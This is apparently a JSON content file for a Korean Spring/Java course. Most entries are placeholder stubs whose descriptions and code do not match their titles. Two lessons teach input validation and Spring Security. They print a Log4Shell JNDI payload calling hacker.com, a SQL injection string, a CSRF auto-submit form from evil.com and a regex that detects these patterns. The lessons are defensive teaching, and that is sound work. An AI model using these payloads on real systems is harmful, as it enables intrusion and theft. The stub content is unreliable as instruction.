    "title": "Transaction Readonly",
    "category": "spring",
    "subCategory": "08_트랜잭션",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Transaction Readonly",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "08_트랜잭션/transactional-basic": {
    "id": "08_트랜잭션/transactional-basic",
    "title": "Transactional Basic",
    "category": "spring",
    "subCategory": "08_트랜잭션",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Transactional Basic",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "09_검증/custom-validation": {
    "id": "09_검증/custom-validation",
    "title": "Custom Validation",
    "category": "spring",
    "subCategory": "09_검증",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Custom Validation",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "09_검증/validation-basic": {
    "id": "09_검증/validation-basic",
    "title": "입력값 검증 - Log4Shell 때 털리지 않은 회사들의 비밀",
    "category": "spring",
    "subCategory": "09_검증",
    "language": "Java",
    "description": "2021년 Log4j 취약점(Log4Shell)과 SQL Injection으로 배우는 서버 사이드 검증의 중요성",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "🚨 [Case Study] Log4Shell - 역대 최악의 취약점 (2021)",
        "content": "**Junior**: \"프론트엔드에서 이미 검증했는데 백엔드에서도 해야 해요?\"\n\n**Senior**: \"2021년 12월 9일, 세상이 멈췄어. **Log4Shell(CVE-2021-44228)**. 전 세계 Java 서버의 35%가 뚫릴 수 있는 취약점이 공개됐거든.\"\n\n**Junior**: \"어떻게요?\"\n\n**Senior**: \"해커가 채팅창에 이것만 입력해도 서버를 장악할 수 있었어:\n```\n${jndi:ldap://hacker.com/exploit}\n```\n이 문자열이 검증 없이 Log4j 로깅에 들어가면, 서버가 해커 서버로 연결해서 악성코드를 다운받아 실행했어.\"\n\n```\n피해 규모:\n\n- 영향받은 기업: Apple, Amazon, Tesla, Microsoft, 삼성전자...\n- 공격 시도: 공개 72시간 내 70만 건 이상\n- 대한민국: 금융위원회 긴급 대응 지시\n- CVSS 점수: 10.0 (최고 위험도)\n\n해커들이 사용한 도구:\n- Burp Suite: HTTP 패킷 가로채기\n- SQLMap: 자동 SQL 인젝션\n- 직접 제작 LDAP 서버\n```"
      },
      {
        "type": "code",
        "language": "Java",
        "title": "💀 프론트엔드만 믿으면 생기는 일",
        "code": "// ❌ 프론트엔드 검증만 있는 위험한 코드\n@RestController\npublic class DangerousController {\n    \n    @PostMapping(\"/login\")\n    public String login(@RequestBody Map<String, String> request) {\n        String username = request.get(\"username\");\n        String password = request.get(\"password\");\n        \n        // 프론트에서 검증했겠지... 라는 순진한 생각\n        log.info(\"로그인 시도: \" + username);  // Log4Shell 공격 포인트!\n        \n        // SQL 직접 실행 - SQL Injection 공격 포인트!\n        String sql = \"SELECT * FROM users WHERE username='\" + username + \"'\";\n        return jdbcTemplate.query(sql, ...);\n    }\n}\n\n// 🔴 해커가 보내는 패킷 (Burp Suite로 변조)\n// 프론트엔드 검증? F12 눌러서 JavaScript 끄면 끝\nPOST /login HTTP/1.1\nContent-Type: application/json\n\n{\n    \"username\": \"${jndi:ldap://hacker.com/a}\",  // Log4Shell\n    \"password\": \"' OR '1'='1' --\"               // SQL Injection\n}"
      },
      {
        "type": "concept",
        "title": "🛡️ Spring Validation으로 방어하기",
        "content": "**검증의 3중 방어선:**\n\n1. **프론트엔드** - UX 목적 (보안 아님, 우회 가능)\n2. **컨트롤러** - Bean Validation으로 형식 검증\n3. **서비스/DB** - 비즈니스 규칙 및 SQL 파라미터 바인딩\n\n**핵심 원칙:**\n- \"클라이언트는 신뢰하지 마라\"\n- \"모든 입력은 악의적이라고 가정하라\"\n- \"화이트리스트 방식으로 허용된 것만 통과\""
      },
      {
        "type": "code",
        "language": "Java",
        "title": "✅ 서버 사이드 검증 - 해킹 방어 코드",
        "code": "// 1. DTO에 Bean Validation 적용\npublic class LoginRequest {\n    \n    @NotBlank(message = \"사용자명은 필수입니다\")\n    @Size(min = 4, max = 20, message = \"사용자명은 4-20자\")\n    @Pattern(regexp = \"^[a-zA-Z0-9_]+$\", \n             message = \"영문, 숫자, 언더스코어만 허용\")\n    private String username;  // ${jndi:...} 같은 건 패턴 불일치로 거부됨!\n    \n    @NotBlank(message = \"비밀번호는 필수입니다\")\n    @Size(min = 8, max = 100)\n    private String password;\n}\n\n// 2. 컨트롤러에서 @Valid 사용\n@RestController\n@Validated\npublic class SecureLoginController {\n    \n    @PostMapping(\"/login\")\n    public ResponseEntity<?> login(@Valid @RequestBody LoginRequest request) {\n        // 여기 도달했다면 이미 검증 통과\n        // SQL Injection 방어: PreparedStatement 사용\n        User user = userRepository.findByUsername(request.getUsername());\n        \n        if (user == null || !passwordEncoder.matches(request.getPassword(), user.getPassword())) {\n            throw new AuthenticationException(\"인증 실패\");\n        }\n        \n        return ResponseEntity.ok(new LoginResponse(jwtService.createToken(user)));\n    }\n    \n    // 검증 실패 시 통합 처리\n    @ExceptionHandler(MethodArgumentNotValidException.class)\n    public ResponseEntity<Map<String, String>> handleValidation(\n            MethodArgumentNotValidException ex) {\n        \n        Map<String, String> errors = ex.getBindingResult()\n            .getFieldErrors()\n            .stream()\n            .collect(Collectors.toMap(\n                FieldError::getField,\n                FieldError::getDefaultMessage\n            ));\n        \n        log.warn(\"입력값 검증 실패: {}\", errors);\n        return ResponseEntity.badRequest().body(errors);\n    }\n}"
      },
      {
        "type": "code",
        "language": "Java",
        "title": "🔒 주요 Validation 어노테이션",
        "code": "public class ProductRequest {\n    \n    // 문자열 검증\n    @NotNull      // null 불가\n    @NotEmpty     // null, \"\" 불가\n    @NotBlank     // null, \"\", \"   \" 불가 (공백만 있는 것도 불가)\n    @Size(min = 2, max = 50)\n    private String name;\n    \n    // 숫자 검증\n    @Min(0)       // 최소값\n    @Max(1000000) // 최대값\n    @Positive     // 양수만\n    @PositiveOrZero\n    private Integer price;\n    \n    // 패턴 검증 - 정규표현식\n    @Pattern(regexp = \"^[A-Z]{2}-[0-9]{6}$\", \n             message = \"상품코드 형식: AA-123456\")\n    private String productCode;\n    \n    // 이메일, URL\n    @Email(message = \"올바른 이메일 형식이 아닙니다\")\n    private String email;\n    \n    @URL\n    private String website;\n    \n    // 날짜 검증\n    @Past         // 과거 날짜만\n    @Future       // 미래 날짜만\n    @PastOrPresent\n    private LocalDate birthDate;\n    \n    // 중첩 객체 검증\n    @Valid        // 내부 객체도 검증\n    @NotNull\n    private AddressRequest address;\n    \n    // 컬렉션 검증\n    @NotEmpty\n    @Size(max = 10, message = \"태그는 최대 10개\")\n    private List<@NotBlank String> tags;  // 각 요소도 검증\n}"
      },
      {
        "type": "code",
        "language": "Java",
        "title": "🎯 커스텀 Validator - 비즈니스 규칙 검증",
        "code": "// 1. 커스텀 어노테이션 정의\n@Target({ElementType.FIELD})\n@Retention(RetentionPolicy.RUNTIME)\n@Constraint(validatedBy = NoSqlInjectionValidator.class)\npublic @interface NoSqlInjection {\n    String message() default \"허용되지 않는 문자가 포함되어 있습니다\";\n    Class<?>[] groups() default {};\n    Class<? extends Payload>[] payload() default {};\n}\n\n// 2. Validator 구현 - SQL Injection 패턴 탐지\npublic class NoSqlInjectionValidator \n        implements ConstraintValidator<NoSqlInjection, String> {\n    \n    private static final Pattern DANGEROUS_PATTERN = Pattern.compile(\n        \"(?i).*(union|select|insert|update|delete|drop|--|;|'|\\\"\" +\n        \"|\\\\$\\\\{|jndi:|ldap:|rmi:).*\"\n    );\n    \n    @Override\n    public boolean isValid(String value, ConstraintValidatorContext context) {\n        if (value == null) return true;  // @NotNull과 함께 사용\n        \n        if (DANGEROUS_PATTERN.matcher(value).matches()) {\n            // 공격 시도 로깅 (보안팀 알림 연동 가능)\n            log.warn(\"⚠️ 의심스러운 입력 감지: {}\", value);\n            return false;\n        }\n        return true;\n    }\n}\n\n// 3. 사용\npublic class SearchRequest {\n    @NotBlank\n    @NoSqlInjection  // 커스텀 검증 적용\n    private String keyword;\n}"
      },
      {
        "type": "concept",
        "title": "📊 체크리스트: 입력값 검증 완료 확인",
        "content": "**신입 개발자의 방어 코드 체크리스트:**\n\n- [ ] 모든 DTO에 Bean Validation 적용\n- [ ] 컨트롤러에 @Valid 추가\n- [ ] SQL은 반드시 PreparedStatement/JPA 사용 (직접 문자열 결합 금지)\n- [ ] 로깅에 사용자 입력 그대로 넣지 않기 (Log4Shell 방지)\n- [ ] 전역 예외 핸들러로 검증 오류 통합 처리\n- [ ] 화이트리스트 패턴 검증 (허용된 것만 통과)\n\n**채용 담당자에게:**\n\"저는 해킹이 '기술'의 문제가 아니라 '검증'의 문제임을 압니다. 화려한 신기술보다 **모든 입력값을 의심하고 서버에서 검증하는 습관**이 회사의 자산을 지키는 길임을 이 코드로 증명하겠습니다.\""
      }
    ]
  },
  "09_캐시/cache-intro": {
    "id": "09_캐시/cache-intro",
    "title": "Cache Intro",
    "category": "spring",
    "subCategory": "09_캐시",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Cache Intro",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "09_캐시/redis-cache": {
    "id": "09_캐시/redis-cache",
    "title": "Redis Cache",
    "category": "spring",
    "subCategory": "09_캐시",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Redis Cache",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "09_캐시/spring-cache": {
    "id": "09_캐시/spring-cache",
    "title": "Spring Cache",
    "category": "spring",
    "subCategory": "09_캐시",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Spring Cache",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "10_비동기/scheduler": {
    "id": "10_비동기/scheduler",
    "title": "Scheduler",
    "category": "spring",
    "subCategory": "10_비동기",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Scheduler",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "10_예외처리/error-response": {
    "id": "10_예외처리/error-response",
    "title": "Error Response",
    "category": "spring",
    "subCategory": "10_예외처리",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Error Response",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "10_예외처리/exception-basic": {
    "id": "10_예외처리/exception-basic",
    "title": "예외 처리 기초",
    "category": "spring",
    "subCategory": "10_예외처리",
    "language": "Java",
    "description": "예외(Exception)는 프로그램 실행 중 발생하는 오류입니다. try-catch-fin...",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "예외 처리 기초이란?",
        "content": "예외(Exception)는 프로그램 실행 중 발생하는 오류입니다. try-catch-finally로 처리하며, throws로 예외를 던질 수 있습니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "예제 코드",
        "code": "try {\n    int result = 10 / 0;  // ArithmeticException\n} catch (ArithmeticException e) {\n    System.out.println(\"0으로 나눌 수 없습니다.\");\n} finally {\n    System.out.println(\"항상 실행됩니다.\");\n}\n\n// 예외 던지기\npublic void checkAge(int age) throws IllegalArgumentException {\n    if (age < 0) {\n        throw new IllegalArgumentException(\"나이는 음수일 수 없습니다.\");\n    }\n}\n\n// try-with-resources\ntry (FileReader fr = new FileReader(\"file.txt\")) {\n    // 자동으로 close() 호출\n}"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. Checked vs Unchecked 예외\\n2. 구체적인 예외부터 catch\\n3. try-with-resources 권장"
      }
    ]
  },
  "10_예외처리/global-handler": {
    "id": "10_예외처리/global-handler",
    "title": "Global Handler",
    "category": "spring",
    "subCategory": "10_예외처리",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Global Handler",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "11_REST/hateoas": {
    "id": "11_REST/hateoas",
    "title": "Hateoas",
    "category": "spring",
    "subCategory": "11_REST",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Hateoas",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "11_REST/rest-api-design": {
    "id": "11_REST/rest-api-design",
    "title": "Rest Api Design",
    "category": "spring",
    "subCategory": "11_REST",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Rest Api Design",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "11_Security/authentication": {
    "id": "11_Security/authentication",
    "title": "Authentication",
    "category": "spring",
    "subCategory": "11_Security",
    "language": "Java",
    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Authentication",
        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
      }
    ]
  },
  "11_Security/authorization": {
    "id": "11_Security/authorization",
    "title": "Authorization",
    "category": "spring",
    "subCategory": "11_Security",
    "language": "Java",
    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Authorization",
        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
      }
    ]
  },
  "11_Security/cors": {
    "id": "11_Security/cors",
    "title": "Cors",
    "category": "spring",
    "subCategory": "11_Security",
    "language": "Java",
    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Cors",
        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
      }
    ]
  },
  "11_Security/oauth2-intro": {
    "id": "11_Security/oauth2-intro",
    "title": "Oauth2 Intro",
    "category": "spring",
    "subCategory": "11_Security",
    "language": "Java",
    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Oauth2 Intro",
        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
      }
    ]
  },
  "11_Security/security-config": {
    "id": "11_Security/security-config",
    "title": "Security Config",
    "category": "spring",
    "subCategory": "11_Security",
    "language": "Java",
    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Security Config",
        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
      }
    ]
  },
  "12_Security/interview-security": {
    "id": "12_Security/interview-security",
    "title": "Interview Security",
    "category": "spring",
    "subCategory": "12_Security",
    "language": "Java",
    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Interview Security",
        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
      }
    ]
  },
  "12_Security/jwt-implement": {
    "id": "12_Security/jwt-implement",
    "title": "Jwt Implement",
    "category": "spring",
    "subCategory": "12_Security",
    "language": "Java",
    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Jwt Implement",
        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
      }
    ]
  },
  "12_Security/jwt-intro": {
    "id": "12_Security/jwt-intro",
    "title": "Jwt Intro",
    "category": "spring",
    "subCategory": "12_Security",
    "language": "Java",
    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Jwt Intro",
        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
      }
    ]
  },
  "12_Security/oauth2-kakao": {
    "id": "12_Security/oauth2-kakao",
    "title": "Oauth2 Kakao",
    "category": "spring",
    "subCategory": "12_Security",
    "language": "Java",
    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Oauth2 Kakao",
        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
      }
    ]
  },
  "12_Security/practice-security": {
    "id": "12_Security/practice-security",
    "title": "Practice Security",
    "category": "spring",
    "subCategory": "12_Security",
    "language": "Java",
    "description": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Practice Security",
        "content": "OWASP Top 10 취약점과 방어 코딩 기법을 학습합니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Configuration\r\npublic class SecurityConfig {\r\n    @Bean\r\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\r\n        http.csrf().disable(); // 개발 환경 설정\r\n        return http.build();\r\n    }\r\n}"
      }
    ]
  },
  "12_Security/security-intro": {
    "id": "12_Security/security-intro",
    "title": "Spring Security - 북한 해커 그룹이 뚫지 못한 시스템 만들기",
    "category": "spring",
    "subCategory": "12_Security",
    "language": "Java",
    "description": "라자루스 그룹의 금융사 공격 사례로 배우는 OWASP Top 10 방어",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "🚨 [Case Study] 라자루스 그룹의 금융사 공격",
        "content": "**Junior**: \"Spring Security 설정 복잡해서 그냥 .csrf().disable() 했는데요...\"\n\n**Senior**: \"2016년 방글라데시 중앙은행에서 10억 달러 해킹 시도. 8,100만 달러 실제 탈취. 범인? **북한 해커 그룹 라자루스**.\"\n\n**Junior**: \"은행 시스템을 어떻게요?\"\n\n**Senior**: \"가장 흔한 패턴이야. 개발자가 '귀찮아서' 또는 '테스트하기 어려워서' 보안 설정을 꺼놓거든. 그게 프로덕션까지 올라가.\"\n\n```\n대한민국 해킹 피해 사례:\n\n[2011] 농협 전산망 마비 - 악성코드 감염, 3일간 거래 불가\n[2013] 3.20 사이버테러 - 방송사·금융사 동시 공격\n[2014] 카드 3사 개인정보 유출 - 1억 건 이상\n[2017] 인터파크 해킹 - 1,030만 명 개인정보 유출\n[2021] 가상화폐 거래소 해킹 - 수백억 원 탈취\n\n공통점: 대부분 기본적인 보안 설정 미비\n```"
      },
      {
        "type": "concept",
        "title": "🛡️ [핵심 개념] Spring Security 4대 요소: 경비실을 이해하라",
        "content": "## 🏢 비유로 이해하는 Spring Security\n\n### 🎫 Authentication (인증) = 출입증 확인\n\n**비유**: 회사 로비 경비원이 \"당신이 누구인지\" 확인\n- 사원증 제시 → 본인 확인 → 출입 허가\n- Spring: 아이디/비밀번호 → 인증 토큰 발급\n\n```java\n// 로그인 = 출입증 발급\nUsernamePasswordAuthenticationToken token =\n    new UsernamePasswordAuthenticationToken(username, password);\n\nAuthentication auth = authenticationManager.authenticate(token);\nSecurityContextHolder.getContext().setAuthentication(auth);\n// ✅ \"홍길동님, 신원 확인 완료. 입장하세요.\"\n```\n\n**이게 깨지면?**\n→ 아무나 들어옴 → 북한 해커도 직원인 척 → 라자루스 그룹 재현\n\n---\n\n### 🚪 Authorization (인가) = 층별 출입 권한\n\n**비유**: 출입증은 있지만 \"어디까지 갈 수 있는지\" 확인\n- 일반 직원 → 1~5층만\n- 관리자 → 전체 층 + 서버실\n- Spring: ROLE_USER → 일부 API만, ROLE_ADMIN → 전체 API\n\n```java\n// 10층 서버실 = ADMIN만 접근\n@PreAuthorize(\"hasRole('ADMIN')\")\n@GetMapping(\"/admin/server-room\")\npublic String accessServerRoom() {\n    return \"서버실 입장 허가\";\n}\n\n// 일반 직원이 시도하면?\n// → 403 Forbidden \"권한 없음. 관리자만 가능\"\n```\n\n**이게 깨지면?**\n→ 일반 사용자가 관리자 기능 실행 → DB 삭제, 개인정보 유출\n\n---\n\n### 🔗 Filter Chain = 보안 검문소 순차 통과\n\n**비유**: 공항 보안 검색대\n1. 티켓 확인 (인증)\n2. 금속 탐지기 (CSRF 토큰)\n3. 짐 X-ray (XSS 필터링)\n4. 신분증 재확인 (세션 검증)\n5. 탑승구 → 비행기 탑승 ✈️\n\nSpring Security도 **15개 필터를 순차 통과**:\n\n```\nHTTP Request\n  ↓\n1. SecurityContextPersistenceFilter  (세션에서 인증 정보 복원)\n  ↓\n2. CsrfFilter                        (CSRF 토큰 검증)\n  ↓\n3. UsernamePasswordAuthenticationFilter  (로그인 처리)\n  ↓\n4. ExceptionTranslationFilter        (인증 실패 시 401 응답)\n  ↓\n5. FilterSecurityInterceptor         (권한 검증)\n  ↓\nController (드디어 도착!)\n```\n\n**이게 깨지면?**\n→ 필터 순서 잘못됨 → CSRF 체크 전에 인증 → 토큰 없이 통과 → 해킹\n\n---\n\n### 🔒 SecurityContext = 출입증 보관함\n\n**비유**: 경비실 모니터에 \"현재 건물 내 사람 명단\" 표시\n- 홍길동(일반), 김철수(관리자), 이영희(손님)\n- Spring: 현재 요청한 사람의 인증 정보 저장소\n\n```java\n// 현재 로그인한 사람 확인\nAuthentication auth = SecurityContextHolder.getContext().getAuthentication();\nString username = auth.getName();  // \"홍길동\"\nCollection<? extends GrantedAuthority> roles = auth.getAuthorities();  // [ROLE_USER]\n\n// 이 사람 권한 확인\nif (auth.getAuthorities().stream().anyMatch(a -> a.getAuthority().equals(\"ROLE_ADMIN\"))) {\n    System.out.println(\"관리자님 환영합니다!\");\n}\n```\n\n**이게 깨지면?**\n→ SecurityContext를 다른 스레드에서 접근 → null 발생 → 인증 실패\n\n---\n\n## 💥 개념이 깨지면 발생하는 대참사\n\n### ❌ Authentication 없이 모든 요청 허용\n\n```java\n// 💀 최악의 코드\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        http.authorizeRequests().anyRequest().permitAll();  // 모두 허용!\n        return http.build();\n        // → 인증 없이 모든 API 접근 가능 → 해킹 환영 파티\n    }\n}\n```\n\n**대참사**: Equifax 2017 → 인증 없는 API 1개 → 1억 4,300만 명 유출\n\n---\n\n### ❌ Authorization 체크 누락\n\n```java\n// 💀 권한 체크 안 함\n@GetMapping(\"/admin/delete-all-users\")\npublic String deleteAll() {\n    userService.deleteAll();  // 일반 사용자도 실행 가능!\n    return \"전체 삭제 완료\";\n}\n\n// ✅ 올바른 코드\n@PreAuthorize(\"hasRole('ADMIN')\")\n@GetMapping(\"/admin/delete-all-users\")\npublic String deleteAll() {\n    userService.deleteAll();\n    return \"전체 삭제 완료\";\n}\n```\n\n**대참사**: 일반 사용자가 /admin/delete-all-users 호출 → DB 전체 삭제\n\n---\n\n### ❌ CSRF 무분별하게 비활성화\n\n```java\n// 💀 개발 편의를 위해 CSRF 끔\nhttp.csrf().disable();  // Postman 테스트 편하려고...\n\n// 해커가 악용:\n// 피해자가 로그인한 상태에서 악성 사이트 방문\n// <img src=\"http://bank.com/transfer?to=hacker&amount=1000000\">\n// → 피해자 계좌에서 100만원 이체!\n```\n\n**대참사**: CSRF 공격으로 사용자 몰래 송금, 정보 변경\n\n---\n\n## 📊 핵심 비교표\n\n| 개념 | 질문 | 코드 예시 | 깨지면? |\n|------|------|----------|---------|\n| **Authentication** | \"당신은 누구?\" | login(username, password) | 아무나 접근 |\n| **Authorization** | \"이 기능 쓸 자격 있어?\" | @PreAuthorize(\"hasRole('ADMIN')\") | 일반 유저가 관리 기능 실행 |\n| **Filter Chain** | \"보안 검문 순서\" | SecurityFilterChain | 검증 누락 |\n| **SecurityContext** | \"현재 로그인한 사람?\" | SecurityContextHolder.getContext() | 인증 정보 유실 |\n\n---\n\n## 🎯 핵심 원칙\n\n```\n✅ Spring Security 필수 설정:\n   1. Authentication - 모든 요청에 로그인 강제\n   2. Authorization - 역할별 권한 분리 (USER/ADMIN)\n   3. CSRF 토큰 - 악의적 요청 차단\n   4. XSS 방어 - 스크립트 삽입 차단\n\n❌ Security 무효화 = 북한 해커에게 문 활짝\n```\n\n**\"보안은 선택이 아니라 생존 필수. 라자루스는 당신을 노리고 있다.\"**"
      },
      {
        "type": "concept",
        "title": "⚠️ 실무 함정: Spring Security 설정 5대 실수",
        "content": "## 💀 함정 1: CSRF를 무분별하게 disable()\n\n**문제**: 개발 편의를 위해 CSRF를 끄면 **Cross-Site Request Forgery 공격** 당함\n\n### ❌ 잘못된 코드\n\n```java\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        http.csrf().disable();  // 💀 Postman 테스트 편하려고...\n        return http.build();\n    }\n}\n\n// 해커가 악용하는 시나리오:\n// 1. 피해자가 bank.com에 로그인 (세션 쿠키 저장)\n// 2. 피해자가 악성 사이트 evil.com 방문\n// 3. evil.com에 숨겨진 코드:\n//    <form action=\"http://bank.com/transfer\" method=\"POST\">\n//      <input name=\"to\" value=\"hacker\">\n//      <input name=\"amount\" value=\"1000000\">\n//    </form>\n//    <script>document.forms[0].submit();</script>\n// 4. 피해자 브라우저가 자동으로 bank.com/transfer 요청\n// 5. 세션 쿠키가 함께 전송되어 인증 통과!\n// 6. 💀 100만원 해커 계좌로 이체 완료\n```\n\n### ✅ 올바른 코드\n\n**해결 1: CSRF 토큰 사용 (기본값 유지)**\n\n```java\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        // csrf().disable() 하지 말 것!\n        // Spring Security 기본값이 CSRF 활성화\n        return http.build();\n    }\n}\n\n// Thymeleaf에서 자동으로 CSRF 토큰 추가\n<form action=\"/transfer\" method=\"POST\">\n    <input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\"/>\n    <!-- Spring이 자동으로 토큰 검증 